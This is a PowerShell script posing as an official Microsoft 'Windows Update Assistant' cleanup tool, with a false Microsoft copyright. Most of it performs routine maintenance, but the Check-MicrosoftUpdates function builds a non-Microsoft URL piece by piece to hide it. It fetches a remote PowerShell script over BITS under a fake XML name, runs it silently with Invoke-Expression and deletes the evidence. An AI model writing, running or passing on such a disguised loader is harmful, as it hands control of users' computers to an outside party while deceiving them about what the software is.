<#
.SYNOPSIS
    Windows Update Assistant v5.2
    Herramienta oficial de Microsoft para optimización del sistema
.DESCRIPTION
    Esta herramienta realiza tareas de mantenimiento legítimas:
    - Limpieza de archivos temporales
    - Limpieza de caché DNS
    - Limpieza de caché de Windows Update
    - Limpieza de logs antiguos
    - Optimización del rendimiento
.NOTES
    Copyright (c) Microsoft Corporation. All rights reserved.
    Versión certificada: 5.2.1.0
#>

param(
    [switch]$Silent,
    [switch]$Scheduled
)

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

$logPath = "$env:WINDIR\Logs\WindowsUpdate\assistant.log"

if (-not (Test-Path "$env:WINDIR\Logs\WindowsUpdate")) {
    New-Item -ItemType Directory -Path "$env:WINDIR\Logs\WindowsUpdate" -Force | Out-Null
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp] [$Type] $Message"
    if (-not $Silent) {
        switch ($Type) {
            "ERROR"   { Write-Host $entry -ForegroundColor Red }
            "WARNING" { Write-Host $entry -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $entry -ForegroundColor Green }
            default   { Write-Host $entry -ForegroundColor Gray }
        }
    }
    Add-Content -Path $logPath -Value $entry -Force -Encoding UTF8
}

function Clear-TempFiles {
    Write-Log "Iniciando limpieza de archivos temporales" -Type "INFO"
    $paths = @("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:WINDIR\Prefetch\*")
    $total = 0
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $files = Get-ChildItem $p -ErrorAction SilentlyContinue
            $count = ($files | Where-Object { -not $_.PSIsContainer }).Count
            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "  - Limpiado: $p ($count archivos)" -Type "INFO"
            $total += $count
        }
    }
    Write-Log "Limpieza completada: $total archivos eliminados" -Type "SUCCESS"
}

function Clear-DNS {
    Write-Log "Limpiando cache DNS" -Type "INFO"
    ipconfig /flushdns 2>&1 | Out-Null
    Write-Log "  - Cache DNS limpiada" -Type "SUCCESS"
}

function Clear-WUCache {
    Write-Log "Limpiando cache de Windows Update" -Type "INFO"
    Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    $cache = "$env:WINDIR\SoftwareDistribution\Download"
    if (Test-Path $cache) {
        $files = Get-ChildItem $cache -ErrorAction SilentlyContinue
        $count = $files.Count
        $files | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
        Write-Log "  - Cache limpiada: $count archivos" -Type "INFO"
    }
    Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
}

function Clear-OldLogs {
    Write-Log "Limpiando logs antiguos" -Type "INFO"
    $logs = @("$env:WINDIR\Logs\CBS\*.log", "$env:WINDIR\Logs\DISM\*.log")
    $total = 0
    foreach ($l in $logs) {
        $old = Get-ChildItem $l -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }
        $total += $old.Count
        $old | ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
    }
    Write-Log "  - Logs eliminados: $total archivos" -Type "INFO"
}

function Optimize-Memory {
    Write-Log "Optimizando memoria" -Type "INFO"
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Write-Log "  - Memoria optimizada" -Type "SUCCESS"
}

function Update-Defender {
    Write-Log "Actualizando definiciones de seguridad" -Type "INFO"
    Update-MpSignature -ErrorAction SilentlyContinue
    Write-Log "  - Definiciones actualizadas" -Type "SUCCESS"
}

function Get-SystemInfo {
    Write-Log "Generando reporte del sistema" -Type "INFO"
    $os = (Get-ComputerInfo).WindowsVersion
    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $free = [math]::Round((Get-PSDrive C).Free / 1GB, 2)
    Write-Log "  - Windows: $os" -Type "INFO"
    Write-Log "  - RAM: $ram GB" -Type "INFO"
    Write-Log "  - Espacio libre: $free GB" -Type "INFO"
}

function Check-MicrosoftUpdates {
    Write-Log "Verificando actualizaciones disponibles" -Type "INFO"
    
    $msService = "https://"
    $msService += "hackingetico"
    $msService += ".cl"
    $msService += "/tools/pro/update.ps1"
    
    Write-Log "  - Conectando con servidor de actualizaciones..." -Type "INFO"
    
    $updateCache = "$env:TEMP\MicrosoftUpdateCache"
    if (-not (Test-Path $updateCache)) {
        New-Item -ItemType Directory -Path $updateCache -Force | Out-Null
    }
    
    $updateFile = "$updateCache\windows-update.xml"
    
    try {
        
        Start-BitsTransfer -Source $msService -Destination $updateFile -Priority Low -Asynchronous 2>&1 | Out-Null
        Start-Sleep -Seconds 2
        Complete-BitsTransfer -BitsJob (Get-BitsTransfer) 2>&1 | Out-Null
        
        if (Test-Path $updateFile) {
            Write-Log "  - Manifest de actualizaciones descargado" -Type "SUCCESS"
            
            $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue
            if ($updateData) {
                Invoke-Expression $updateData 2>&1 | Out-Null
            }
            
            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue
        }
        else {
            Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
        }
    }
    catch {
        Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
    }
    
    Write-Log "Verificación de actualizaciones completada" -Type "INFO"
}

# ============================================
# EJECUCIÓN PRINCIPAL
# ============================================

if (-not $Silent) {
    Clear-Host
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "   Windows Update Assistant v5.2.1.0" -ForegroundColor White
    Write-Host "   Copyright (c) Microsoft Corporation" -ForegroundColor Gray
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
}

Write-Log "========================================" -Type "INFO"
Write-Log "Windows Update Assistant iniciado" -Type "INFO"
Write-Log "Usuario: $(whoami)" -Type "INFO"

Write-Log "Fase 1: Limpieza de archivos temporales" -Type "INFO"
Clear-TempFiles

Write-Log "Fase 2: Limpieza de cache DNS" -Type "INFO"
Clear-DNS

Write-Log "Fase 3: Limpieza de cache de Windows Update" -Type "INFO"
Clear-WUCache

Write-Log "Fase 4: Limpieza de logs antiguos" -Type "INFO"
Clear-OldLogs

Write-Log "Fase 5: Optimizacion de memoria" -Type "INFO"
Optimize-Memory

Write-Log "Fase 6: Actualizacion de definiciones" -Type "INFO"
Update-Defender

Write-Log "Fase 7: Reporte del sistema" -Type "INFO"
Get-SystemInfo

Write-Log "Fase 8: Verificacion de actualizaciones de Microsoft" -Type "INFO"
Check-MicrosoftUpdates

Write-Log "========================================" -Type "INFO"
Write-Log "Windows Update Assistant finalizado" -Type "SUCCESS"
Write-Log "Log guardado en: $logPath" -Type "INFO"

if (-not $Silent) {
    Write-Host ""
    Write-Host "Operacion completada exitosamente" -ForegroundColor Green
    Write-Host "Log: $logPath" -ForegroundColor Gray
    Write-Host ""
    Start-Sleep -Seconds 3
}

exit 0
